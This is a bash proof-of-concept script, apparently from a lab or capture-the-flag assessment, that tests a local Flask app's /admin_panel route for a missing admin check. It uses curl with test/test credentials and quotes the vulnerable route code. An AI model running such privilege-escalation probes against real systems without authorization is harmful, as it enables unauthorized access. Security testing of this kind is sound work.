#!/bin/bash

# POC: Missing Authorization Check in Admin Panel
# Target: /admin_panel route
# Vulnerability: No is_admin flag validation despite error message claiming admin-only access

TARGET="http://localhost:32768"

echo "=== POC: Admin Panel Authorization Bypass ==="
echo ""
echo "Target: $TARGET/admin_panel"
echo ""

# Step 1: Simulate regular user login
echo "[+] Step 1: Login as regular user 'test' (is_admin=False)"
echo "Sending login request with username=test, password=test"
curl -s -c /tmp/cookies.txt -X POST "$TARGET/login" \
  -d "username=test&password=test" \
  -w "\nHTTP Status: %{http_code}\n" | head -10

echo ""
echo "[+] Step 2: Access admin panel as regular user"
echo "Accessing /admin_panel with regular user session"
curl -s -b /tmp/cookies.txt "$TARGET/admin_panel" -w "\nHTTP Status: %{http_code}\n" | grep -E "(Here is the flag|error|HTTP|admin)" | head -10

echo ""
echo "[+] Step 3: Analysis of /admin_panel source code"
cat << 'ANALYSIS'

CODE ANALYSIS:
File: /app/website/app/routes.py, Lines 84-91

@app.route('/admin_panel')
def admin_panel():
    debug_session = None
    debug = None
    try:
        sess = verify_session()
    except SessionError as e:
        return render_template('login.html', error=e.message)
    
    return render_template('dashboard.html', error_message='Only administrator users can open this section.', debug_session=debug_session)

VULNERABILITY:
1. The function checks verify_session() but does NOT check is_admin flag
2. Any authenticated user can access this route
3. The error_message is displayed in the template but doesn't prevent access
4. The admin_panel function returns render_template('dashboard.html') for ALL authenticated users
5. Missing: if not session.get('is_admin'): return error response

EXPLOIT:
- Login as regular user (test/test)
- Access /admin_panel
- Receive "Only administrator users can open this section" error message
- But still get the rendered dashboard with potential admin content
- No HTTP 403 Forbidden or actual access denial occurs

ANALYSIS

echo ""
echo "[+] Step 4: Testing direct access without authentication"
curl -s -b "" "$TARGET/admin_panel" -w "\nHTTP Status: %{http_code}\n" | head -5

echo ""
echo "=== VULNERABILITY CONFIRMED ==="
echo "The /admin_panel route is missing authorization checks."
echo "Any authenticated user can access it regardless of is_admin flag."
echo "This allows privilege escalation from regular user to admin functionality."

